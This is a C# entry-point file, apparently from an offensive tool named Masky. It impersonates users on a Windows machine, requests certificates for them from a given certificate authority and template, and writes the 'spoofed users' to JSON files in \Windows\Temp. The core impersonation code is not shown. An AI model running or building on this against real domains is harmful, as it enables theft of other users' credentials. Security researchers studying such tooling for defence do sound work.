
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;

namespace Masky
{
    public class Program
    {
        public static bool WriteResultsInFile(List<SpoofedUser> SpoofedUsers, StreamWriter outStream)
        {
            try
            {
                if (SpoofedUsers.Count != 0)
                {
                    string jsonContent = JsonConvert.SerializeObject(SpoofedUsers, Formatting.Indented);
                    outStream.WriteLine(jsonContent);
                }
                else
                {
                    outStream.WriteLine("");
                }
                outStream.Flush();
                outStream.Close();
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.ToString());
                return false;
            }
            return true;
        }

        public static StreamWriter getOutputStream(string filename)
        {
            try
            {
                string outputFilePath = String.Format("{0}{1}", "\\Windows\\Temp\\", filename);
                StreamWriter outStream = new StreamWriter(outputFilePath);
                return outStream;
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.ToString());
                return null;
            }
        }

        public static bool setDebugFile(string filename)
        {
            try
            {
                string filePath = String.Format("{0}{1}", "\\Windows\\Temp\\", filename);
                StreamWriter dbgStream = new StreamWriter(filePath);
                Console.SetError(dbgStream);
            }
            catch
            {
                return false;
            }
            return true;
        }

        public static void Main(string[] args)
        {
            try
            {
                string ca = args[0];
                string template = args[1];
                string output_file = args[2];
                string debug_file = args[3];

                StreamWriter outStream = getOutputStream(output_file);
                setDebugFile(debug_file);
                Impersonate impersonate = new Impersonate();
                Cert cert = new Cert(ca, template);
                Action action = cert.GetCertUser;
                impersonate.Run(action);
                WriteResultsInFile(cert.spoofedUsers, outStream);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.ToString());
            }
            Console.Error.Close();
        }
    }

}

